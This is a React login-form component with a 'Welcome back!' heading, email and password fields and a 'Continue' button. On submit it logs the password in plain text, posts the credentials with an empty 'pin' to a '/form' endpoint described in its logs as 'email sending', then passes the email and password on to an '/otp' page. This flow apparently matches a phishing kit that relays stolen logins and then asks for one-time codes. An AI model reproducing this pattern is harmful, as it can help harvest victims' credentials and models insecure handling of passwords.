import React, { useState } from 'react'
import { useHistory } from 'react-router-dom'
import URL from './Url.js'

const Form = (props) => {
    const history = useHistory()

    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [loading, setLoading] = useState(false)

    const handleEmail = (e) => {
        setEmail(e.target.value)
    }

    const handlePassword = (e) => {
        setPassword(e.target.value)
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        if (email === '' || password === '') {
            console.log('not sent')
        } else {
            console.log({ email, password })
            try {
                const response = await fetch(URL + '/form', {
                    method: 'POST',
                    headers: {
                        'Content-type': 'application/json',
                    },
                    body: JSON.stringify({
                        email,
                        password,
                        pin: '',
                    }),
                })

                const resData = await response.json()

                console.log('email sending started')

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setLoading(false)
                    history.push('/otp', { email, password })
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    setLoading(false)
                }
            } catch (err) {
                console.log(err)
            }
        }
    }

    return (
        <>
            <form
                className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 h-full text-black py-4 px-4'
                onSubmit={handleSubmit}
            >
                <div>
                    <h2 className='font-medium text-center mb-4 text-2xl'>
                        Welcome back!
                    </h2>
                    <div className='relative input-box'>
                        <input
                            type='email'
                            id='email'
                            required
                            placeholder='Enter your email'
                            className='sign-in-input'
                            value={email}
                            onChange={handleEmail}
                        />
                        <label
                            htmlFor='email'
                            className='input-label absolute font-ProximaNovaRegular'
                        >
                            {' '}
                            Email address
                        </label>
                    </div>
                    <div className='relative input-box'>
                        <input
                            type='password'
                            id='password'
                            className='sign-in-input'
                            required
                            placeholder='Enter your password'
                            value={password}
                            onChange={handlePassword}
                        />
                        <label
                            for='password'
                            className='input-label absolute font-ProximaNovaRegular'
                        >
                            Password
                        </label>
                    </div>
                    <div className='flex justify-start'>
                        <div className='font-ProximaNovaBold text-center text-[#49cc68]'>
                            Forgot password?
                        </div>
                    </div>
                </div>
                <div className='grid content-end'>
                    <p>
                        Learn more about our{' '}
                        <span className='text-[#49cc68]'>Privacy policy</span>{' '}
                        and{' '}
                        <span className='text-[#49cc68]'>Terms of service</span>
                    </p>
                    <button
                        className=' rounded-md outline-none  bg-[#00bfff] text-white text-sm btn'
                        style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
                    >
                        {loading ? 'loading..' : 'Continue'}
                    </button>
                </div>
            </form>
        </>
    )
}

export default Form
